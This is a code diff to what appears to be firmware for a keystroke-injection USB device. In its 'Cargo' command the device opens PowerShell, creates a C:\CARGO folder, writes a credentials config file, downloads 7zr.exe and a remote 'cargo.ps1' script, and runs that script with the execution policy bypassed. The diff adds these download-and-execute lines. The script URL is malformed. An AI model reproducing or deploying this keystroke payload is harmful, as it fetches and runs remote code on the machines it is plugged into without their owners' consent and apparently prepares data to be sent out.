@@ -101,10 +101,11 @@ void executeCommand(String command)
   }
   else if (command == "Cargo") {
     openPowerShell();
-    Keyboard.println("cd C:\\");
-    Keyboard.println("mkdir cargo");
-    Keyboard.println("echo \"{"URL": "api.example.com", "Port": "443", "esp_id": "your_esp_id_here", "delivery_key": "your_delivery_key_here", "encryption_password": "YourEncryptionPassword"}\" > C:\\CARGO\\cred");
-
+    Keyboard.println("New-Item -ItemType Directory -Force -Path \"C:\\CARGO\" | Set-Location -PassThru");
+    Keyboard.println("echo \"{"URL": "api.example.com", "Port": "443", "esp_id": "your_esp_id_here", "delivery_key": "your_delivery_key_here", "encryption_password": "YourEncryptionPassword"}\" > cred");
+    Keyboard.println("Invoke-WebRequest https://www.7-zip.org/a/7zr.exe -OutFile c:\\7zr.exe");
+    Keyboard.println("Invoke-WebRequest https://github/cargo.ps1 -OutFile c:\\cargo.ps1");
+    Keyboard.println("PowerShell.exe -ExecutionPolicy Bypass -File cargo.ps1");
   }
   else if (command == "None") {
     for (int i = 0; i < 20; i++)
